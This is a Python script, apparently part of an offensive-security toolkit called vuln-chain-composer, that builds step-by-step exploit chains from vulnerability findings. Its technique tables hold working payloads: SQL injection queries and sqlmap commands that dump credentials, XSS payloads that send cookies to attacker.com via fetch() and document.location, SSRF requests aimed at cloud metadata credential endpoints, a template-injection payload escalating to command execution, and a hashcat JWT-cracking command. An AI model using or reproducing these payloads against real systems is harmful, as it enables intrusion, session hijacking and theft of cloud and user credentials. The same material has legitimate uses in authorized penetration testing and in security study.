#!/usr/bin/env python3
"""
Chain Builder - vuln-chain-composer
Takes correlated findings and builds concrete exploit chains with step-by-step instructions.
Author: orizon.one
"""

import argparse
import json
from pathlib import Path
from datetime import datetime


def log(msg):
    print(f"[*] {msg}")


def success(msg):
    print(f"[+] {msg}")


def warn(msg):
    print(f"[!] {msg}")


# Detailed exploitation techniques per vulnerability type
EXPLOIT_TECHNIQUES = {
    "sqli": {
        "error_based_sqli": {
            "technique": "Error-based SQL Injection",
            "tools": ["sqlmap", "manual"],
            "steps": [
                "Identify injectable parameter: {parameter} at {url}",
                "Determine database type from error messages",
                "Extract database schema: ' UNION SELECT table_name FROM information_schema.tables--",
                "Dump target table: ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
                "Extract credentials: ' UNION SELECT username,password FROM users--",
            ],
            "data_gained": ["database_schema", "credentials", "user_data"],
        },
        "boolean_based_sqli": {
            "technique": "Boolean-based Blind SQL Injection",
            "tools": ["sqlmap", "manual"],
            "steps": [
                "Confirm boolean injection at {url} parameter {parameter}",
                "Enumerate database name character by character using: ' AND SUBSTRING(database(),1,1)='a'--",
                "Enumerate tables using information_schema",
                "Extract data using conditional responses",
            ],
            "data_gained": ["database_schema", "credentials", "user_data"],
        },
        "time_based_sqli": {
            "technique": "Time-based Blind SQL Injection",
            "tools": ["sqlmap"],
            "steps": [
                "Confirm time-based injection at {url} parameter {parameter}",
                "Use: ' AND IF(1=1,SLEEP(5),0)-- to confirm",
                "Automate extraction with sqlmap: sqlmap -u '{url}' -p '{parameter}' --technique=T --dump",
            ],
            "data_gained": ["database_schema", "credentials", "user_data"],
        },
    },
    "xss": {
        "reflected_xss": {
            "technique": "Reflected Cross-Site Scripting",
            "tools": ["browser", "curl"],
            "steps": [
                "Inject payload at {url} parameter {parameter}",
                "Payload: <script>document.location='https://attacker.com/steal?c='+document.cookie</script>",
                "Send crafted URL to victim",
                "Capture victim's session cookie on attacker server",
            ],
            "data_gained": ["session_cookie", "csrf_token"],
        },
        "stored_xss": {
            "technique": "Stored Cross-Site Scripting",
            "tools": ["browser", "curl"],
            "steps": [
                "Submit XSS payload to stored field at {url}",
                "Payload: <script>fetch('https://attacker.com/exfil?d='+document.cookie)</script>",
                "Wait for victim (or admin) to view the page containing stored payload",
                "Collect exfiltrated data from attacker server",
            ],
            "data_gained": ["session_cookie", "csrf_token", "page_content"],
        },
        "dom_xss": {
            "technique": "DOM-based Cross-Site Scripting",
            "tools": ["browser"],
            "steps": [
                "Identify DOM sink at {url}",
                "Craft URL with payload in fragment/parameter that reaches the sink",
                "Payload triggers in victim's browser without server reflection",
                "Exfiltrate data via injected JavaScript",
            ],
            "data_gained": ["session_cookie", "dom_data"],
        },
    },
    "ssrf": {
        "ssrf": {
            "technique": "Server-Side Request Forgery",
            "tools": ["curl", "python"],
            "steps": [
                "Send SSRF payload to {url} parameter {parameter}",
                "Target internal endpoint: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "Extract cloud IAM credentials from metadata response",
                "Use stolen credentials to access cloud resources (S3, EC2, etc.)",
            ],
            "data_gained": ["cloud_credentials", "internal_network_data"],
        },
        "ssrf_cloud_metadata": {
            "technique": "SSRF to Cloud Metadata",
            "tools": ["curl", "python"],
            "steps": [
                "Exploit SSRF at {url} to reach metadata endpoint",
                "AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "Azure: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
                "Extract and use temporary credentials",
            ],
            "data_gained": ["cloud_credentials", "iam_role"],
        },
    },
    "idor": {
        "default": {
            "technique": "Insecure Direct Object Reference",
            "tools": ["curl", "burp"],
            "steps": [
                "Authenticate as low-privilege user",
                "Access resource at {url} with own ID",
                "Modify ID parameter {parameter} to target other users",
                "Enumerate IDs sequentially to access all records",
            ],
            "data_gained": ["user_data", "pii"],
        },
    },
    "takeover": {
        "subdomain_takeover": {
            "technique": "Subdomain Takeover",
            "tools": ["manual"],
            "steps": [
                "Identify dangling CNAME/A record for {url}",
                "Register the unclaimed resource on the cloud provider",
                "Host attacker-controlled content on the subdomain",
                "Set up cookie-stealing page to capture wildcard cookies",
            ],
            "data_gained": ["session_cookie", "subdomain_control"],
        },
    },
    "redirect": {
        "open_redirect": {
            "technique": "Open Redirect",
            "tools": ["browser", "curl"],
            "steps": [
                "Craft redirect URL: {url}?redirect=https://attacker.com/phish",
                "If used in OAuth flow, redirect steals authorization code",
                "Send link to victim (appears legitimate due to trusted domain)",
                "Capture redirected data on attacker server",
            ],
            "data_gained": ["oauth_token", "credentials"],
        },
    },
    "jwt": {
        "jwt_none_algorithm": {
            "technique": "JWT None Algorithm Bypass",
            "tools": ["python", "jwt_tool"],
            "steps": [
                "Capture valid JWT token from {url}",
                "Decode JWT and modify algorithm to 'none'",
                "Modify claims (e.g., change role to admin, change user ID)",
                "Re-encode without signature and send modified token",
            ],
            "data_gained": ["admin_access", "impersonation"],
        },
        "jwt_weak_secret": {
            "technique": "JWT Weak Secret Attack",
            "tools": ["hashcat", "jwt_tool"],
            "steps": [
                "Capture JWT from {url}",
                "Crack HMAC secret: hashcat -m 16500 jwt.txt wordlist.txt",
                "Forge new JWT with arbitrary claims using cracked secret",
                "Use forged token for authentication bypass",
            ],
            "data_gained": ["admin_access", "impersonation"],
        },
    },
    "bucket": {
        "public_bucket": {
            "technique": "Public Cloud Storage Bucket",
            "tools": ["aws-cli", "curl"],
            "steps": [
                "List bucket contents at {url}",
                "Identify sensitive files (backups, configs, credentials)",
                "Download sensitive files",
                "Check for write access to upload malicious content",
            ],
            "data_gained": ["sensitive_files", "credentials", "backups"],
        },
    },
    "ssti": {
        "default": {
            "technique": "Server-Side Template Injection",
            "tools": ["curl", "tplmap"],
            "steps": [
                "Inject template payload at {url} parameter {parameter}",
                "Detect engine: {{7*7}} or ${7*7} or <%= 7*7 %>",
                "Escalate to RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "Execute system commands for full server compromise",
            ],
            "data_gained": ["rce", "server_access"],
        },
    },
}

# Transition techniques: how one vuln's output feeds into the next
CHAIN_TRANSITIONS = {
    ("session_cookie", "xss"): "Use stolen session cookie to authenticate as victim, then exploit XSS in authenticated context",
    ("session_cookie", "idor"): "Use stolen session to access authenticated IDOR endpoints as victim",
    ("session_cookie", "sqli"): "Use stolen session to reach authenticated SQLi endpoint",
    ("credentials", "admin_access"): "Use extracted credentials to login to admin panel",
    ("cloud_credentials", "bucket"): "Use stolen IAM credentials to access private S3/GCS buckets",
    ("cloud_credentials", "rce"): "Use stolen cloud credentials to spawn instances or modify deployments",
    ("database_schema", "credentials"): "Use schema knowledge to extract credential tables via SQLi",
    ("subdomain_control", "session_cookie"): "Use controlled subdomain to serve cookie-stealing page for parent domain",
    ("rce", "credentials"): "Use RCE to read config files containing database/API credentials",
    ("admin_access", "rce"): "Use admin panel features (file upload, template edit) to achieve RCE",
    ("user_data", "credentials"): "Use leaked user data for targeted credential stuffing/phishing",
    ("oauth_token", "admin_access"): "Use stolen OAuth token to access victim's account with their privileges",
}


def get_technique(finding):
    """Get detailed exploitation technique for a finding."""
    category = finding.get("category", finding.get("type", "unknown").split("_")[0])
    vuln_type = finding.get("type", "unknown")

    cat_techniques = EXPLOIT_TECHNIQUES.get(category, {})
    technique = cat_techniques.get(vuln_type, cat_techniques.get("default", None))

    if not technique:
        # Fallback generic technique
        technique = {
            "technique": f"Exploit {vuln_type}",
            "tools": ["manual"],
            "steps": [
                f"Exploit {vuln_type} at {{url}}",
                "Collect evidence of exploitation",
                "Determine what data/access is gained",
            ],
            "data_gained": ["unknown"],
        }

    return technique


def build_detailed_chain(chain):
    """Build a detailed exploit chain with concrete steps from a correlation chain."""
    primary = chain.get("primary_finding", {})
    supporting = chain.get("supporting_findings", [])
    original_steps = chain.get("steps", [])

    # Build detailed steps for primary finding
    detailed_steps = []
    step_num = 0

    # Phase 1: Initial exploitation
    technique = get_technique(primary)
    phase1 = {
        "phase": "Initial Exploitation",
        "finding_id": primary.get("id", ""),
        "technique": technique["technique"],
        "target": primary.get("url", ""),
        "tools_needed": technique["tools"],
        "detailed_steps": [],
        "data_gained": technique["data_gained"],
        "prerequisites": ["Network access to target"],
    }

    for step_text in technique["steps"]:
        step_num += 1
        rendered = step_text.replace("{url}", primary.get("url", "TARGET_URL"))
        rendered = rendered.replace("{parameter}", primary.get("parameter", "PARAM") if isinstance(primary, dict) else "PARAM")
        phase1["detailed_steps"].append({
            "step": step_num,
            "action": rendered,
            "expected_result": "Successful exploitation",
            "verification": "Check response for expected data/behavior",
        })

    detailed_steps.append(phase1)

    # Phase 2+: Supporting findings and chain transitions
    for i, sf in enumerate(supporting):
        sf_technique = get_technique(sf)
        phase = {
            "phase": f"Escalation Step {i + 1}",
            "finding_id": sf.get("id", ""),
            "technique": sf_technique["technique"],
            "target": sf.get("url", sf.get("domain", "")),
            "tools_needed": sf_technique["tools"],
            "detailed_steps": [],
            "data_gained": sf_technique["data_gained"],
            "prerequisites": [f"Data from Phase: {detailed_steps[-1]['phase']}"],
        }

        # Add transition step
        prev_data = detailed_steps[-1]["data_gained"]
        sf_category = sf.get("category", sf.get("type", "").split("_")[0])
        for prev_datum in prev_data:
            transition_key = (prev_datum, sf_category)
            if transition_key in CHAIN_TRANSITIONS:
                step_num += 1
                phase["detailed_steps"].append({
                    "step": step_num,
                    "action": CHAIN_TRANSITIONS[transition_key],
                    "expected_result": "Transition to next exploitation phase",
                    "verification": "Confirm access/data from previous step enables this step",
                })
                break

        for step_text in sf_technique["steps"]:
            step_num += 1
            rendered = step_text.replace("{url}", sf.get("url", sf.get("domain", "TARGET")))
            rendered = rendered.replace("{parameter}", sf.get("parameter", "PARAM") if isinstance(sf, dict) else "PARAM")
            phase["detailed_steps"].append({
                "step": step_num,
                "action": rendered,
                "expected_result": "Successful exploitation",
                "verification": "Check response for expected data/behavior",
            })

        detailed_steps.append(phase)

    # Phase Final: Impact realization
    step_num += 1
    final_phase = {
        "phase": "Impact Realization",
        "finding_id": "chain_complete",
        "technique": "Combined Impact",
        "target": primary.get("domain", "target"),
        "tools_needed": [],
        "detailed_steps": [{
            "step": step_num,
            "action": f"Chain complete: {chain.get('description', chain.get('name', 'exploit chain'))}",
            "expected_result": f"Achieved {chain.get('overall_severity', 'HIGH')} impact",
            "verification": "Document evidence from all phases",
        }],
        "data_gained": ["full_chain_impact"],
        "prerequisites": ["All previous phases succeeded"],
    }
    detailed_steps.append(final_phase)

    # Calculate feasibility
    num_steps = step_num
    requires_user_interaction = any(
        "victim" in s.get("action", "").lower() or "user" in s.get("action", "").lower()
        for phase in detailed_steps for s in phase["detailed_steps"]
    )
    feasibility = max(1, 10 - num_steps)
    if requires_user_interaction:
        feasibility = max(1, feasibility - 2)

    # Build alternatives and dependencies
    dependencies = []
    for i, phase in enumerate(detailed_steps[:-1]):
        dependencies.append({
            "phase": phase["phase"],
            "required_for": detailed_steps[i + 1]["phase"],
            "if_blocked": f"Chain breaks at {phase['phase']} - look for alternative {phase['technique']}",
        })

    return {
        "chain_id": f"chain_{primary.get('id', 'unknown')}_{chain.get('name', '').lower().replace(' ', '_')[:30]}",
        "name": chain.get("name", "Unknown Chain"),
        "description": chain.get("description", ""),
        "overall_severity": chain.get("overall_severity", "HIGH"),
        "impact_amplification": chain.get("impact_amplification", ""),
        "total_steps": step_num,
        "feasibility_score": feasibility,
        "requires_user_interaction": requires_user_interaction,
        "phases": detailed_steps,
        "dependencies": dependencies,
        "original_correlation": chain,
    }


def main():
    parser = argparse.ArgumentParser(description="Chain Builder - orizon.one")
    parser.add_argument("--input", "-i", required=True, help="Correlation data JSON file (output of correlate.py)")
    parser.add_argument("--output", "-o", help="Output JSON file")
    args = parser.parse_args()

    log("Building detailed exploit chains...")

    with open(args.input) as f:
        data = json.load(f)

    chains = data.get("chains", [])
    log(f"Loaded {len(chains)} correlated chains")

    if not chains:
        warn("No chains found in input. Run correlate.py first.")
        return

    built_chains = []
    for chain in chains:
        detailed = build_detailed_chain(chain)
        built_chains.append(detailed)
        success(f"Built chain: {detailed['name']} ({detailed['total_steps']} steps, feasibility: {detailed['feasibility_score']}/10)")

    # Stats
    by_severity = {}
    total_steps = 0
    for c in built_chains:
        sev = c["overall_severity"]
        by_severity[sev] = by_severity.get(sev, 0) + 1
        total_steps += c["total_steps"]

    output = {
        "meta": {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "type": "detailed_exploit_chains",
            "tool": "vuln-chain-composer by orizon.one",
            "chains_built": len(built_chains),
            "total_steps": total_steps,
        },
        "chains": built_chains,
    }

    output_path = args.output or "detailed_chains.json"
    with open(output_path, "w") as f:
        json.dump(output, f, indent=2)
    success(f"Results saved to: {output_path}")

    print(f"\n{'='*60}")
    print(f"  CHAIN BUILD SUMMARY")
    print(f"{'='*60}")
    print(f"  Chains built      : {len(built_chains)}")
    print(f"  Total steps       : {total_steps}")
    print(f"\n  By Severity:")
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
        if sev in by_severity:
            print(f"    {sev:10s} : {by_severity[sev]}")
    print(f"\n  Chain Details:")
    for i, c in enumerate(built_chains[:10]):
        interaction = " [requires user interaction]" if c["requires_user_interaction"] else ""
        print(f"    {i+1}. {c['name']}")
        print(f"       Severity: {c['overall_severity']} | Steps: {c['total_steps']} | Feasibility: {c['feasibility_score']}/10{interaction}")
        for phase in c["phases"]:
            print(f"       -> {phase['phase']}: {phase['technique']}")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
